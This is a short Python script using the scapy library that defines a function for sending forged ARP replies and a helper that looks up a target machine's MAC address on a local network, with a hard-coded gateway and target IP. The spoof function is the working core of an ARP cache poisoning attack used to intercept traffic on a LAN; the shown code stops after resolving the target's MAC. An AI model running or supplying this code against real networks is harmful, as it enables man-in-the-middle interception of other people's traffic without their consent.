import scapy.all as scapy
import time

def spoof(target_ip,target_mac,spoof_ip):
    spoofed_pac =  scapy.ARP(pdst=target_ip,hwdst=target_mac, psrc=spoof_ip,op = 2)
    scapy.send(spoofed_pac,verbose = 0)

def get_mac(target_ip):
    arp_req = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / scapy.ARP(pdst=target_ip)
    reply, _ = scapy.srp(arp_req, timeout=3, verbose=0)
    if reply:
        return reply[0][1].hwsrc  
    return None


gateaway_ip = "192.168.1.1"
target_ip = "192.168.1.33"

target_mac = None
while not target_mac:
    target_mac = get_mac(target_ip)
    if not target_mac:
        print("target mac not found\n")

print("target mac is:{}".format(target_mac))


